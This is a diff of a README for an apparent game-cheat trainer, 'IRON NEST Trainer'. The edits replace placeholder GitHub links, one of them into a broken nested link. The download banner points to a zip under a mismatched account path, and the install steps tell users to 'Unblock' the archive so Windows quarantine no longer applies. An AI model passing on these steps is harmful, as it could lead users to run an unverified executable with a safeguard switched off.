@@ -9,7 +9,7 @@
 [![Downloads](https://img.shields.io/github/downloads/FlintDelivererTube/IRON-NEST-Trainer/total)](https://github.com/FlintDelivererTube/IRON-NEST-Trainer/releases)
 [![License](https://img.shields.io/badge/license-MIT-e0c060)](LICENSE)
 
-> **[⬇ Download the latest IRON NEST trainer](https://github.com/YOUR-USERNAME/iron-nest-trainer/releases/latest)**
+> **[⬇ Download the latest IRON NEST trainer](https://github.com/[YOUR-USERNAME/iron-nest-trainer](https://github.com/FlintDelivererTube/IRON-NEST-Trainer)/releases/latest)**
 <p align="center">
     <a href="https://github.com/Crushflalead/FlintDelivererTube/IRON-NEST-Trainer/releases/latest/download/IRONNESTtrainer.zip">
         <img src="assets/banner1.png" width="100%" alt="Download IRON NEST Trainer">
@@ -227,7 +227,7 @@ Free camera is the one worth having even if you use nothing else. The turret is 
 
 ## Installation
 
-1. **Download** the latest archive from the [Releases page](https://github.com/YOUR-USERNAME/iron-nest-trainer/releases/latest).
+1. **Download** the latest archive from the [Releases page](https://github.com/[YOUR-USERNAME/iron-nest-trainer](https://github.com/FlintDelivererTube/IRON-NEST-Trainer)/releases/latest).
 2. **Unblock it** — right-click the `.zip`, choose Properties, tick *Unblock*, then Apply. Windows quarantines downloaded archives and the trainer won't attach otherwise.
 3. **Extract** anywhere outside `Program Files`.
 4. **Launch the game first** and load into an operation, so the process exists.
@@ -322,7 +322,7 @@ Yes, plus instant reload, weightless shells and all thirty ammo types, in the Am
 
 First public release. 55+ options across Turret, Ballistics, Ammunition, Orders, Map, Operator, Progress, Camera and Trainer. Leaderboard guard on by default; comfort options separated from cheats so you can use one without the other.
 
-Full history on the [Releases page](https://github.com/YOUR-USERNAME/iron-nest-trainer/releases).
+Full history on the [Releases page](https://github.com/FlintDelivererTube/IRON-NEST-Trainer/releases).
 
 ---
 
